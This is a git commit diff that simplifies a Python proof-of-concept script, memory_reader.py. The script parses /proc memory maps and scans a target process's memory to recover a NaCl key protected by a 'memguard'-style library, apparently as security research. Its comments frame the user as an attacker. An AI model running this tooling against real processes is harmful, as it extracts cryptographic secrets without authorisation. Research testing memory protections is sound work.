c4f7d6200dfa6e09db6339941f4575e09bffc890
Denis Brodbeck <denis@shahaya.com>
2017-10-21 13:17:33 +0200

    Simplify py script.

--- memory_reader.py
+++ memory_reader.py
@@ -11,18 +11,12 @@ from subprocess import Popen, PIPE
 # Attacker knows default size of nacl key
 KEY_SIZE = 32
 # After we find a valid memory pointer, we'll read past KEY_SIZE in order to catch data after that point
-EAGER_READ = KEY_SIZE * 3
-
-def running_procs(name):
-    subproc = Popen(['ps', '-o', 'pid,uid', '--no-headers', '-C', name], shell=False, stdout=PIPE)
-    candidates = [line.split() for line in subproc.stdout]
-    return candidates
-
+EAGER_READ = KEY_SIZE * 5
 
 def get_maps(pid, mode='w'):
     maps = []
-    with open('/proc/{0}/maps'.format(pid), 'r') as f:
-        for line in f:
+    with open('/proc/{0}/maps'.format(pid), 'r') as file:
+        for line in file:
             address, perms, offset, dev, inode, name = line.replace('\n', ';').split(None, 5)
             if int(offset, 16) != 0 or int(inode) != 0 or mode not in perms:
                 continue
@@ -31,7 +25,6 @@ def get_maps(pid, mode='w'):
             maps.append((score, addr_lo, addr_hi, name))
     maps.sort(reverse=True)
     return [m[1:] for m in maps]
-
 
 def scan_addr_range(pid, addr_lo, addr_hi, name, try_harder=False):
     logging.info('Scanning pid {0} range {1:x}-{2:x} {3}'.format(pid, addr_lo, addr_hi, name))
@@ -57,31 +50,24 @@ def scan_addr_range(pid, addr_lo, addr_hi, name, try_harder=False):
         for n, p in enumerate(pointers):
             f.seek(p, 0)
             key = f.read(EAGER_READ)
-            print('{0}:\t\t{1}'.format(p, key))
+            print('{0}:    {1}'.format(p, key))
             #print(p, key) # Prints key in hex
 
 def main():
     logging.basicConfig(level=logging.INFO)
 
-    parser = argparse.ArgumentParser(description='Recover protected key from memory of memgrdpeek process')
-    parser.add_argument('--pid', required=False, default=None,
-                        help='Process id of the app process')
+    parser = argparse.ArgumentParser(description='Recover protected key from memory of memguarded process')
+    parser.add_argument('--pid', required=True, default=None,
+                        help='Process id of the app')
     parser.add_argument('--try-harder', required=False, default=False, action='store_true',
                         help='Try harder')
     args = parser.parse_args()
 
-    if args.pid:
-        procs = [(args.pid, 0)]
-    else:
-        procs = running_procs('memgrdpeek')
-        if not procs:
-            logging.error('Cannot find memgrdpeek process. Try setting --pid parameter or use sudo.')
-            return
+    pid = args.pid
 
-    for pid, uid in procs:
-        logging.info('Trying pid {0}'.format(pid))
-        for addr_lo, addr_hi, name in get_maps(pid):
-            scan_addr_range(pid, addr_lo, addr_hi, name, try_harder=args.try_harder)
+    logging.info('Trying pid {0}'.format(pid))
+    for addr_lo, addr_hi, name in get_maps(pid):
+        scan_addr_range(pid, addr_lo, addr_hi, name, try_harder=args.try_harder)
 
 
 if __name__ == '__main__':
